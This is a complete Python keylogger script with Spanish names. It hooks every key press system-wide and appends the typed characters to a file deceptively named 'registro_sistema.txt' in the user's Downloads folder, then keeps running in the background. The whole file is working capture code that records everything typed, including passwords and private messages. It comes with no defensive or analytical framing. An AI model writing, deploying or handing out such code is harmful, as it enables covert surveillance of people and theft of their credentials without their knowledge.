import time
import keyboard
import os
import datetime
import sys

def rastreador_teclado():
    archivo_registro = os.path.join(os.path.expanduser("~"), "Downloads", "registro_sistema.txt")
    
    os.makedirs(os.path.dirname(archivo_registro), exist_ok=True)
    
    def guardar_datos(datos):
        try:
            with open(archivo_registro, "a", encoding="utf-8") as f:
                f.write(datos)
        except Exception as e:
            pass

    def en_tecla(evento):
        if evento.event_type == keyboard.KEY_DOWN:
            teclas_especiales = {
                'space': ' ',
                'enter': '\n', 
                'backspace': '',  
                'tab': '    ',    
                'caps lock': '[BLOQ_MAYUS]',
                'esc': '[ESC]',
                'windows': '[WIN]',
                'menu': '[MENU]'
            }
            
            caracter_tecla = teclas_especiales.get(evento.name, evento.name)
            
            if evento.name in ['shift', 'ctrl', 'alt', 'right shift', 'left shift', 
                             'right ctrl', 'left ctrl', 'right alt', 'left alt', 
                             'windows', 'up', 'down', 'left', 'right', 'delete']:
                return
            
            if caracter_tecla:
                guardar_datos(caracter_tecla)

    print(f"Rastreador iniciado. Registrando en: {archivo_registro}")
    print("El programa ahora corre en segundo plano...")

    keyboard.hook(en_tecla)
    
    try:
        while True:
            time.sleep(60)  
    except:
        pass

if __name__ == "__main__":
    rastreador_teclado()